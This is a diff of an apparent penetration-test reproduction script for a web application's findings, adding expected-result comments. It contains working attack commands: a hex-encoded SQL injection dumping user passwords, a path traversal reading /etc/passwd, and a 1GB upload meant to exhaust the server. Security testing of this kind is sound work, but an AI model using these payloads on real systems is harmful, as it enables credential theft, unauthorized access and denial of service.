@@ -19,16 +19,21 @@ enter "<url>/confirm-client/31/32/<token>"
 enter "<url>/post-rule/init/admin/1"
 
 # Finding 1: Inject SQL to extract all user credentials
+# Expected result: List of all users and passwords
 payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
 curl -k "<url>/init_client/${payload}/31"
 
 # Finding 2: Inject '../' into the file path parameter to read unauthorized files
+# Expected result: Contents of /etc/passwd
 payload=$(echo "../../etc/passwd" | xxd -p)
 enter "<url>/get_rule/${payload}"
 
 # Finding 3: Generate a large file (1GB) and upload it
+# Expected result: Server becomes unresponsive or logs indicate resource exhaustion.
 dd if=/dev/zero of=largefile.txt bs=1M count=1024
 curl -X POST -F "file=@largefile.txt" -k "<url>/post-rule/init/validsite/validuser"
+
+
 
 
 
